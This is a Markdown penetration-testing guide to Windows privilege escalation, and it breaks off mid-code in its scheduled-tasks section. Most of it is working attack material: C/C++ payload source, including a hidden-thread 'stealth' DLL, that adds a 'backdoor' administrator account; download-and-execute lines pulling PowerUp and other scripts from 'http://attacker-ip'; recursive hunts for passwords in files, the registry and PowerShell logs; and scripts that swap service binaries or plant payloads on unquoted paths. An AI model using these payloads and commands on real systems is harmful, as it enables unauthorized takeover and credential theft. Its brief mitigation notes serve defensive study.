# Windows Privilege Escalation

## Overview

Privilege escalation is the process of elevating access from unprivileged to privileged user status on Windows systems. During penetration testing, initial foothold is often gained as an unprivileged user, but administrative privileges are typically required to access sensitive data, configuration files, or extract password hashes.

## Learning Objectives

This guide covers essential Windows privilege escalation techniques:

- **Enumerating Windows** - Establishing situational awareness and gathering system information
- **Leveraging Windows Services** - Exploiting service misconfigurations for privilege escalation
- **Abusing Other Windows Components** - Utilizing Scheduled Tasks and other Windows features
- **Exploiting Vulnerabilities** - Leveraging system exploits for privilege elevation

## Table of Contents

1. [Enumerating Windows](#1-enumerating-windows)
   - [1.1 Understanding Windows Privileges and Access Control](#11-understanding-windows-privileges-and-access-control)
   - [1.2 Situational Awareness](#12-situational-awareness)
   - [1.3 Hidden in Plain View](#13-hidden-in-plain-view)
   - [1.4 Information Goldmine PowerShell](#14-information-goldmine-powershell)
   - [1.5 Automated Enumeration](#15-automated-enumeration)
2. [Leveraging Windows Services](#2-leveraging-windows-services)
   - [2.1 Service Binary Hijacking](#21-service-binary-hijacking)
   - [2.2 DLL Hijacking](#22-dll-hijacking)
   - [2.3 Unquoted Service Paths](#23-unquoted-service-paths)
3. [Abusing Other Windows Components](#3-abusing-other-windows-components)
   - [3.1 Scheduled Tasks](#31-scheduled-tasks)
   - [3.2 Using Exploits](#32-using-exploits)

---

# 1. Enumerating Windows

Every target system is unique due to OS versions, patch levels, and configurations. Understanding how to gather and leverage system information is crucial for privilege escalation. This section covers Windows privilege structures, situational awareness methods, and information gathering techniques.

## 1.1 Understanding Windows Privileges and Access Control

Windows employs several security mechanisms to control access and privileges:

### Security Identifier (SID)

Windows uses SIDs to uniquely identify security principals (users, groups, computers).

**SID Structure:** `S-R-X-Y`
- **S**: Literal "S" indicating SID
- **R**: Revision (always "1")
- **X**: Identifier Authority (e.g., "5" for NT Authority)
- **Y**: Sub-authorities (Domain ID + Relative ID)

**Example SID:**
```
S-1-5-21-1336799502-1441772794-948155058-1001
```

**Well-Known SIDs:**
```powershell
S-1-0-0                       # Nobody
S-1-1-0                       # Everyone
S-1-5-11                      # Authenticated Users
S-1-5-18                      # Local System
S-1-5-domainidentifier-500    # Administrator
```

### Access Tokens

Access tokens contain security context information:
- User SID
- Group SIDs
- Privileges
- Token scope

**Check token information:**
```powershell
whoami /all
whoami /priv
whoami /groups
```

### Mandatory Integrity Control (MIC)

Five integrity levels restrict process interactions:

1. **System** - Highly trusted processes (Winlogon, LSASS)
2. **High** - Elevated administrative processes
3. **Medium** - Standard user processes (default)
4. **Low** - Sandboxed/restricted processes
5. **Untrusted** - Highly restricted processes

**Check integrity levels:**
```powershell
# Current user integrity
whoami /groups | findstr "Mandatory Label"

# Process integrity
Get-Process | Select-Object Name, Id, @{Name="IntegrityLevel";Expression={(Get-Process -Id $_.Id).MainModule.ModuleName}}

# File integrity
icacls C:\Windows\System32\cmd.exe
```

### User Account Control (UAC)

UAC issues two tokens to administrators:
- **Standard user token** - Default operations
- **Administrator token** - Elevated operations

**UAC Bypass Detection:**
```powershell
# Check if running with high integrity
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Check UAC settings
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object EnableLUA, ConsentPromptBehaviorAdmin
```

## 1.2 Situational Awareness

Systematic information gathering is critical for privilege escalation success.

### Essential Information Checklist

```powershell
# Core system information (referenced throughout this guide)
whoami                    # Current user context
whoami /all              # Complete user information including groups and privileges
whoami /priv             # User privileges
whoami /groups           # Group memberships
hostname                 # System hostname
$env:COMPUTERNAME        # Alternative hostname method

# System details
systeminfo               # Complete system information
Get-ComputerInfo         # PowerShell alternative

# User and group enumeration
Get-LocalUser            # Local users
Get-LocalGroup           # Local groups  
net user                 # Command line alternative
net localgroup           # Command line alternative
Get-LocalGroupMember Administrators
Get-LocalGroupMember "Remote Desktop Users"
Get-LocalGroupMember "Remote Management Users"

# Network configuration
ipconfig /all
route print
netstat -ano

# Applications and processes
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
Get-Process
tasklist /svc
```

### Advanced System Enumeration

**Environment Variables:**
```powershell
Get-ChildItem Env: | Sort-Object Name
[Environment]::GetEnvironmentVariables()
```

**Scheduled Tasks:**
```powershell
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath, Author
schtasks /query /fo LIST /v
```

**Services:**
```powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject win32_service | Select-Object Name, State, PathName, StartMode, StartName
```

**Drives and Shares:**
```powershell
Get-PSDrive -PSProvider FileSystem
net share
Get-SmbShare
```

**Registry Analysis:**
```powershell
# AutoRun entries
reg query HKCU\Software\SimonTatham\PuTTY\Sessions


Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Installed software
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" | ForEach-Object {Get-ItemProperty $_.PSPath}
```

## 1.3 Hidden in Plain View

Sensitive information is often stored in easily accessible locations.

### File System Search Techniques

**Search for sensitive files:**
```powershell
# Password files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *password*,*pass*,*pwd* -File -Recurse -ErrorAction SilentlyContinue

# Configuration files
Get-ChildItem -Path C:\ -Include *.config,*.ini,*.xml,*.conf -File -Recurse -ErrorAction SilentlyContinue

# Document files
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx -File -Recurse -ErrorAction SilentlyContinue

# Backup files
Get-ChildItem -Path C:\ -Include *.bak,*.backup,*.old -File -Recurse -ErrorAction SilentlyContinue
```

**Search file contents:**
```powershell
# Search for passwords in files
Select-String -Path "C:\*" -Pattern "password" -Recurse -ErrorAction SilentlyContinue
findstr /si password *.txt *.ini *.config

# Search for specific keywords
Select-String -Path "C:\*" -Pattern "admin|administrator|root|sa|service" -Recurse -ErrorAction SilentlyContinue
```

### Common Sensitive Locations

**Configuration Directories:**
```powershell
# IIS configuration
Get-Content "C:\inetpub\wwwroot\web.config" -ErrorAction SilentlyContinue

# Apache/XAMPP
Get-ChildItem -Path "C:\xampp" -Include *.txt,*.ini -Recurse -ErrorAction SilentlyContinue

# Application configs
Get-ChildItem -Path "C:\Program Files*" -Include *.config,*.ini -Recurse -ErrorAction SilentlyContinue
```

**User Directories:**
```powershell
# Desktop files
Get-ChildItem -Path "C:\Users\*\Desktop" -Include *.txt,*.doc* -Recurse -ErrorAction SilentlyContinue

# Documents
Get-ChildItem -Path "C:\Users\*\Documents" -Include *.txt,*.doc*,*.pdf -Recurse -ErrorAction SilentlyContinue

# Downloads
Get-ChildItem -Path "C:\Users\*\Downloads" -Recurse -ErrorAction SilentlyContinue
```

### Registry Password Locations

```powershell
# VNC passwords
Get-ItemProperty "HKLM:\SOFTWARE\RealVNC\WinVNC4" -ErrorAction SilentlyContinue

# Autologon credentials
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUserName, DefaultPassword

# Putty sessions
Get-ChildItem "HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions" -ErrorAction SilentlyContinue

# SNMP parameters
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" -ErrorAction SilentlyContinue
```

## 1.4 Information Goldmine PowerShell

PowerShell logging mechanisms often contain valuable credential information.

### PowerShell History Analysis

**PSReadLine History:**
```powershell
# Get history file path
(Get-PSReadlineOption).HistorySavePath

# Read history content
Get-Content (Get-PSReadlineOption).HistorySavePath

# Alternative history locations
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Built-in PowerShell History:**
```powershell
Get-History
Get-History | Export-Csv -Path "history.csv"
```

### PowerShell Transcription

**Find transcript files:**
```powershell
# Common transcript locations
Get-ChildItem -Path "C:\Users\*\Documents\*transcript*" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Transcripts" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Logs" -Recurse -ErrorAction SilentlyContinue

# Search for transcript files by content
Get-ChildItem -Path C:\ -Include "*.txt" -Recurse | Select-String -Pattern "Windows PowerShell transcript start" -ErrorAction SilentlyContinue
```

**Analyze transcript content:**
```powershell
# Look for credential creation patterns
Select-String -Path "C:\*transcript*.txt" -Pattern "ConvertTo-SecureString|PSCredential|Get-Credential" -Recurse -ErrorAction SilentlyContinue

# Search for password patterns
Select-String -Path "C:\*transcript*.txt" -Pattern "password|pwd|pass" -Recurse -ErrorAction SilentlyContinue
```

### Script Block Logging

**Event Log Analysis:**
```powershell
# PowerShell Script Block Logging events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}

# Decode Script Block content
$events = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}
$events | ForEach-Object {$_.Message}

# Search for specific patterns
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104 -and $_.Message -like "*password*"}
```

**PowerShell Module Logging:**
```powershell
# Module logging events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4103}

# Command execution events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4105 -or $_.Id -eq 4106}
```

### Credential Extraction from PowerShell

**SecureString Decryption:**
```powershell
# If you find SecureString creation in logs
$securePassword = ConvertTo-SecureString "found_encrypted_string" -Key $key
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePassword)
$plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
```

## 1.5 Automated Enumeration

Automated tools accelerate the enumeration process but should complement manual techniques.

### WinPEAS

**Installation and Execution:**
```powershell
# Download winPEAS
iwr -uri http://attacker-ip/winPEASx64.exe -Outfile winPEAS.exe

# Execute with different verbosity levels
.\winPEAS.exe
.\winPEAS.exe quiet
.\winPEAS.exe systeminfo
.\winPEAS.exe userinfo
.\winPEAS.exe processinfo
.\winPEAS.exe servicesinfo
.\winPEAS.exe filesinfo
```

**Targeted Scans:**
```powershell
# Check specific privilege escalation vectors
.\winPEAS.exe fast
.\winPEAS.exe searchfast
.\winPEAS.exe cmd
```

### Alternative Tools

**PowerUp (PowerSploit):**
```powershell
# Download and import
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceUnquoted
```

**Seatbelt:**
```powershell
# Download and execute
.\Seatbelt.exe all
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=remote
```

**SharpUp:**
```powershell
# .NET implementation of PowerUp
.\SharpUp.exe audit
```

### JAWS (Just Another Windows Enum Script)

```powershell
# PowerShell-based enumeration
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/jaws-enum.ps1')
```

### Custom Enumeration Scripts

**Combined Information Gathering:**
```powershell
# Custom enumeration function
function Invoke-WinEnum {
    Write-Host "[+] Starting Windows Enumeration" -ForegroundColor Green
    
    # System Information
    Write-Host "`n[+] System Information" -ForegroundColor Yellow
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
    
    # Current User Context
    Write-Host "`n[+] Current User Context" -ForegroundColor Yellow
    whoami /all
    
    # Local Users and Groups
    Write-Host "`n[+] Local Users" -ForegroundColor Yellow
    Get-LocalUser | Select-Object Name, Enabled, LastLogon
    
    # Network Information
    Write-Host "`n[+] Network Configuration" -ForegroundColor Yellow
    ipconfig /all
    route print
    netstat -ano | findstr LISTENING
    
    # Running Processes
    Write-Host "`n[+] Running Processes" -ForegroundColor Yellow
    Get-Process | Select-Object Name, Id, Path | Sort-Object Name
    
    # Services
    Write-Host "`n[+] Running Services" -ForegroundColor Yellow
    Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName
    
    # Scheduled Tasks
    Write-Host "`n[+] Scheduled Tasks" -ForegroundColor Yellow
    Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, Author
    
    # PowerShell History
    Write-Host "`n[+] PowerShell History" -ForegroundColor Yellow
    if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
        Get-Content (Get-PSReadlineOption).HistorySavePath | Select-Object -Last 20
    }
}

# Execute enumeration
Invoke-WinEnum
```

### Tool Comparison and Limitations

| Tool | Strengths | Limitations |
|------|-----------|-------------|
| **winPEAS** | Comprehensive, color-coded output | Can miss custom configurations |
| **PowerUp** | Service-focused, modular | Requires PowerShell execution policy bypass |
| **Seatbelt** | .NET based, detailed output | Large output requires filtering |
| **Manual** | Complete control, thorough | Time-intensive |

**Best Practice Approach:**
1. Start with automated tools for quick wins
2. Follow up with targeted manual enumeration
3. Always verify automated tool findings
4. Combine multiple tools for comprehensive coverage

# 2. Leveraging Windows Services

Windows Services are long-running background executables managed by the Service Control Manager, similar to daemons on Unix systems. Services run under specific user accounts (LocalSystem, Network Service, Local Service, domain users, or local users) and represent prime targets for privilege escalation.

## 2.1 Service Binary Hijacking

Service binary hijacking exploits weak file permissions on service executables to replace them with malicious binaries that execute with elevated privileges.

### Service Enumeration

**List all services with binary paths:**
```powershell
# Get services with paths (requires interactive logon)
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Alternative methods
Get-Service | Select-Object Name, Status, @{Name="Path";Expression={(Get-WmiObject win32_service -Filter "Name='$($_.Name)'").PathName}}
wmic service get name,pathname,state
sc query
```

**Filter for non-Windows services:**
```powershell
# Services outside System32
Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -notlike "C:\Windows\System32*" -and $_.PathName -ne $null} | Select Name, PathName, State, StartMode
```

### Permission Analysis

**Check file permissions:**
```powershell
# Using icacls
icacls "C:\path\to\service.exe"

# Using PowerShell ACL
Get-Acl "C:\path\to\service.exe" | Format-List

# Check directory permissions
icacls "C:\Program Files\Application\"

# Automated permission check
Get-ChildItem "C:\Program Files\" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    if ($acl.Access | Where-Object {$_.IdentityReference -eq "BUILTIN\Users" -and $_.FileSystemRights -match "FullControl|Modify|Write"}) {
        Write-Output "Writable: $($_.FullName)"
    }
}
```

### icacls Permission Masks

| Mask | Permissions |
|------|-------------|
| **F** | Full access |
| **M** | Modify access |
| **RX** | Read and execute |
| **R** | Read-only |
| **W** | Write-only |

### Service Control

**Check service startup type:**
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'servicename'}
Get-Service servicename | Select-Object Name, StartType
```

**Service control commands:**
```powershell
# Start/Stop services
Start-Service servicename
Stop-Service servicename
Restart-Service servicename

# Command line alternatives
net start servicename
net stop servicename
sc start servicename
sc stop servicename
```

**Check restart permissions:**
```powershell
# Check shutdown privilege (see section 1.2 for whoami commands)
whoami /priv | findstr "SeShutdownPrivilege"

# Test service control
try {
    Stop-Service servicename -WhatIf
    "Can control service"
} catch {
    "Cannot control service: $($_.Exception.Message)"
}
```

### Malicious Binary Creation

**Standard privilege escalation payloads (used throughout this guide):**

*Simple C payload:*
```c
#include <stdlib.h>

int main() {
    int i;
    i = system("net user backdoor Password123! /add");
    i = system("net localgroup administrators backdoor /add");
    return 0;
}
```

*Cross-compilation:*
```bash
# On Kali Linux
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe  # 64-bit
i686-w64-mingw32-gcc adduser.c -o adduser32.exe  # 32-bit
```

*Advanced payload with error handling:*
```c
#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    // Create user and add to administrators
    if (CreateProcess(NULL, "cmd.exe /c net user backdoor Password123! /add", 
                     NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    if (CreateProcess(NULL, "cmd.exe /c net localgroup administrators backdoor /add", 
                     NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return 0;
}
```

### Exploitation Process

**Step-by-step exploitation:**
```powershell
# 1. Backup original binary
copy "C:\vulnerable\service.exe" "C:\temp\service.exe.bak"

# 2. Replace with malicious binary (using payload from section 2.1)
iwr -uri http://attacker-ip/adduser.exe -Outfile malicious.exe
move malicious.exe "C:\vulnerable\service.exe"

# 3. Restart service (if permissions allow)
Restart-Service servicename

# 4. If no restart permissions, reboot (requires SeShutdownPrivilege)
shutdown /r /t 0

# 5. Verify privilege escalation (see section 1.2 for user enumeration commands)
Get-LocalUser | Where-Object Name -eq "backdoor"
Get-LocalGroupMember Administrators | Where-Object Name -like "*backdoor*"
```

### PowerUp Integration

**Using PowerUp for automated detection:**
```powershell
# Download and import PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerUp.ps1')

# Find modifiable service files
Get-ModifiableServiceFile

# Use built-in abuse function
Install-ServiceBinary -Name 'servicename'

# Custom binary replacement
Install-ServiceBinary -Name 'servicename' -Path 'C:\temp\malicious.exe'
```

## 2.2 DLL Hijacking

DLL hijacking exploits the Windows DLL search order to load malicious libraries instead of legitimate ones.

### DLL Search Order

**Standard search order (SafeDllSearchMode enabled):**
1. Application directory
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory
4. Windows directory (`C:\Windows`)
5. Current directory
6. PATH environment variable directories

### DLL Hijacking Types

**Missing DLL Hijacking:**
- Service attempts to load non-existent DLL
- Place malicious DLL in search path
- Gets loaded when service starts

**DLL Replacement:**
- Replace legitimate DLL with malicious version
- Requires write permissions to DLL location

### Process Monitor Analysis

**Using ProcMon for DLL analysis:**
```powershell
# Filter for specific process
# Process Name: contains "servicename"
# Operation: is "CreateFile" or "Process and Thread Activity"
# Path: contains ".dll"

# Common ProcMon filters for DLL analysis:
# - NAME NOT FOUND (missing DLLs)
# - PATH NOT FOUND (incorrect paths)
# - ACCESS DENIED (permission issues)
```

### Malicious DLL Creation

**Standard DLL payloads:**

*Basic DLL template (C++):*
```cpp
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Execute same payload as binary version (section 2.1)
            system("net user dlluser Password123! /add");
            system("net localgroup administrators dlluser /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

*Advanced stealth DLL:*
```cpp
#include <windows.h>
#include <stdio.h>

DWORD WINAPI BackgroundTask(LPVOID lpParam) {
    Sleep(5000); // Wait 5 seconds
    
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcess(NULL, "cmd.exe /c net user dlluser Password123! /add && net localgroup administrators dlluser /add", 
                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, BackgroundTask, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

*DLL compilation:*
```bash
# Cross-compile on Kali (same process as binaries in section 2.1)
x86_64-w64-mingw32-gcc malicious.cpp --shared -o malicious.dll  # 64-bit
i686-w64-mingw32-gcc malicious.cpp --shared -o malicious32.dll  # 32-bit
```

### DLL Hijacking Detection

**Manual enumeration:**
```powershell
# Check application directory permissions
Get-ChildItem "C:\Program Files\" -Directory | ForEach-Object {
    $acl = Get-Acl $_.FullName
    if ($acl.Access | Where-Object {$_.IdentityReference -eq "BUILTIN\Users" -and $_.FileSystemRights -match "Write|FullControl"}) {
        Write-Output "Writable directory: $($_.FullName)"
    }
}

# Search for missing DLLs in event logs
Get-WinEvent -LogName System | Where-Object {$_.Message -like "*dll*" -and $_.LevelDisplayName -eq "Error"}
```

**Automated tools:**
```powershell
# PowerUp DLL hijacking checks
Find-PathDLLHijack
Find-ProcessDLLHijack

# WinPEAS DLL analysis
.\winPEAS.exe quiet filesinfo
```

### Common Vulnerable Applications

**Known DLL hijacking targets:**
- FileZilla (`TextShaping.dll`)
- VLC Media Player
- Custom enterprise applications
- Third-party services

## 2.3 Unquoted Service Paths

Unquoted service paths exploit Windows' CreateProcess function behavior when service paths contain spaces without quotes.

### Vulnerability Mechanics

**Path interpretation example:**
```
Service Path: C:\Program Files\My App\My Service\service.exe

Windows attempts to execute:
1. C:\Program.exe
2. C:\Program Files\My.exe  
3. C:\Program Files\My App\My.exe
4. C:\Program Files\My App\My Service\service.exe
```

### Detection Methods

**PowerShell enumeration:**
```powershell
# Get services with unquoted paths
Get-CimInstance -ClassName win32_service | Where-Object {
    $_.PathName -ne $null -and 
    $_.PathName -notlike 'C:\Windows\*' -and 
    $_.PathName -like '* *' -and 
    $_.PathName -notlike '"*'
} | Select Name, PathName, State, StartMode

# Alternative detection
Get-WmiObject win32_service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike '"*' -and $_.PathName -notlike "C:\Windows\*"} | Select Name, PathName
```

**Command line detection:**
```cmd
# Using WMIC
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# Using SC
sc query | findstr "SERVICE_NAME\|BINARY_PATH_NAME"
```

**PowerUp detection:**
```powershell
# Import PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerUp.ps1')

# Find unquoted service paths
Get-UnquotedService

# Detailed analysis
Get-ServiceUnquoted
```

### Permission Analysis

**Check directory write permissions:**
```powershell
# Test write access to potential hijack directories
$paths = @(
    "C:\Program Files\",
    "C:\Program Files\Application\",
    "C:\Program Files\Application Name\"
)

foreach ($path in $paths) {
    try {
        $testFile = Join-Path $path "test.tmp"
        "test" | Out-File $testFile -ErrorAction Stop
        Remove-Item $testFile -ErrorAction SilentlyContinue
        Write-Output "Writable: $path"
    } catch {
        Write-Output "Not writable: $path - $($_.Exception.Message)"
    }
}

# Using icacls for detailed permissions
icacls "C:\Program Files\Application\" | findstr "Users\|Everyone\|Authenticated Users"
```

### Exploitation Process

**Manual exploitation:**
```powershell
# 1. Identify vulnerable service
Get-UnquotedService

# 2. Create malicious executable (use payload from section 2.1)
copy adduser.exe "C:\Program Files\Application\Program.exe"

# 3. Start the service  
Start-Service VulnerableService

# 4. Verify exploitation (see section 1.2 for enumeration commands)
Get-LocalUser | Where-Object Name -eq "backdoor"
```

**PowerUp automation:**
```powershell
# Automated exploitation
Write-ServiceBinary -Name 'VulnerableService' -Path "C:\Program Files\Application\Program.exe"

# Restart service
Restart-Service VulnerableService

# Custom payload (using standard user creation pattern from section 2.1)
Write-ServiceBinary -Name 'VulnerableService' -Path "C:\hijack\malicious.exe" -Command "net user pwned Password123! /add && net localgroup administrators pwned /add"
```

### Service Control Verification

**Check service restart capabilities:**
```powershell
# Test if user can control service
try {
    Stop-Service ServiceName -WhatIf
    Start-Service ServiceName -WhatIf
    "User can control service"
} catch {
    "Cannot control service: Requires administrative privileges or system reboot"
}

# Check service configuration
Get-Service ServiceName | Select-Object Name, Status, StartType
Get-CimInstance -ClassName win32_service -Filter "Name='ServiceName'" | Select Name, StartMode, State, StartName
```

### Advanced Exploitation Techniques

**Persistence through multiple paths:**
```powershell
# Place executables in multiple potential paths
$maliciousExe = "C:\temp\payload.exe"
$targetPaths = @(
    "C:\Program.exe",
    "C:\Program Files\Application.exe", 
    "C:\Program Files\Application Name\Service.exe"
)

foreach ($path in $targetPaths) {
    if (Test-Path (Split-Path $path)) {
        try {
            Copy-Item $maliciousExe $path -ErrorAction Stop
            Write-Output "Placed payload at: $path"
        } catch {
            Write-Output "Failed to place at: $path"
        }
    }
}
```

### Mitigation and Detection

**Security best practices:**
- Always quote service paths with spaces
- Implement proper directory permissions
- Regular service configuration auditing
- Use least privilege service accounts

**Detection queries:**
```powershell
# Audit all services for unquoted paths
Get-CimInstance win32_service | Where-Object {
    $_.PathName -and 
    $_.PathName -like "* *" -and 
    $_.PathName -notlike '"*'
} | Select Name, PathName, StartName | Export-Csv UnquotedServices.csv

# Monitor for suspicious service binaries
Get-ChildItem "C:\Program Files\" -File -Include "*.exe" -Recurse | Where-Object {
    $_.Directory.Name -ne $_.BaseName
} | Select FullName, CreationTime, LastWriteTime
```

# 3. Abusing Other Windows Components

Beyond services, Windows offers additional attack surfaces through scheduled tasks and system exploits. This section covers privilege escalation through task scheduler abuse and various exploit categories.

## 3.1 Scheduled Tasks

Windows Task Scheduler executes automated tasks based on triggers. These tasks can be exploited for privilege escalation when they run with elevated privileges but have weak file permissions.

### Task Enumeration

**List all scheduled tasks:**
```powershell
# Detailed task information
schtasks /query /fo LIST /v

# PowerShell cmdlet
Get-ScheduledTask | Select-Object TaskName, State, Author, @{Name="RunAsUser";Expression={(Get-ScheduledTask $_.TaskName | Get-ScheduledTaskInfo).RunAsUser}}

# Filter for enabled tasks
Get-ScheduledTask | Where-Object State -eq "Ready" | Select-Object TaskName, TaskPath, Author

# Get task details
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskAction
```

**Find tasks running as privileged users:**
```powershell
# Tasks running as SYSTEM or Administrator
schtasks /query /fo LIST /v | findstr /B /C:"TaskName" /C:"Run As User"

# PowerShell filtering
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $info = Get-ScheduledTaskInfo $task.TaskName -ErrorAction SilentlyContinue
    if ($info -and ($info.RunAsUser -like "*admin*" -or $info.RunAsUser -like "*system*")) {
        [PSCustomObject]@{
            TaskName = $task.TaskName
            State = $task.State
            RunAsUser = $info.RunAsUser
            Actions = (Get-ScheduledTaskAction $task.TaskName -ErrorAction SilentlyContinue).Execute
        }
    }
}
```

### Key Analysis Points

**Critical information to extract:**
1. **Principal (Run As User)** - Which account executes the task
2. **Triggers** - When/how the task is executed  
3. **Actions** - What programs/scripts are executed

**Essential fields to analyze:**
- `Run As User` - Target privilege level
- `Task To Run` - Executable/script path
- `Next Run Time` - When task will execute
- `Schedule Type` - Frequency of execution
- `Author` - Who created the task

### Advanced Task Analysis

**Detailed task inspection:**
```powershell
# Export all task details
Get-ScheduledTask | ForEach-Object {
    $taskName = $_.TaskName
    $task = Get-ScheduledTask $taskName -ErrorAction SilentlyContinue
    $info = Get-ScheduledTaskInfo $taskName -ErrorAction SilentlyContinue
    $actions = Get-ScheduledTaskAction $taskName -ErrorAction SilentlyContinue
    $triggers = Get-ScheduledTaskTrigger $taskName -ErrorAction SilentlyContinue
    
    [PSCustomObject]@{
        TaskName = $taskName
        State = $task.State
        Author = $task.Author
        RunAsUser = $info.RunAsUser
        NextRun = $info.NextRunTime
        LastRun = $info.LastRunTime
        Actions = ($actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join "; "
        Triggers = ($triggers | ForEach-Object { $_.ToString() }) -join "; "
        WorkingDirectory = $actions[0].WorkingDirectory
    }
} | Export-Csv ScheduledTasks.csv -NoTypeInformation
```

**Filter for exploitable tasks:**
```powershell
# Tasks with writable executables
Get-ScheduledTask | ForEach-Object {
    $actions = Get-ScheduledTaskAction $_.TaskName -ErrorAction SilentlyContinue
    foreach ($action in $actions) {
        if ($action.Execute -and (Test-Path $action.Execute)) {
            $acl = Get-Acl $action.Execute -ErrorAction SilentlyContinue
            if ($acl.Access | Where-Object {
                $_.IdentityReference -eq "BUILTIN\Users" -and 
                $_.FileSystemRights -match "FullControl|Modify|Write"
            }) {
                [PSCustomObject]@{
                    TaskName = $_.TaskName
                    Executable = $action.Execute
                    Writable = $true
                    RunAsUser = (Get-ScheduledTaskInfo $_.TaskName).RunAsUser
                }
            }
        }
    }
}
```

### Permission Analysis

**Check executable permissions:**
```powershell
# Analyze task executable permissions
function Test-TaskExecutablePermissions {
    param($TaskName)
    
    $actions = Get-ScheduledTaskAction $TaskName -ErrorAction SilentlyContinue
    foreach ($action in $actions) {
        if ($action.Execute) {
            Write-Output "Checking: $($action.Execute)"
            icacls $action.Execute
            
            # Check if current user can modify
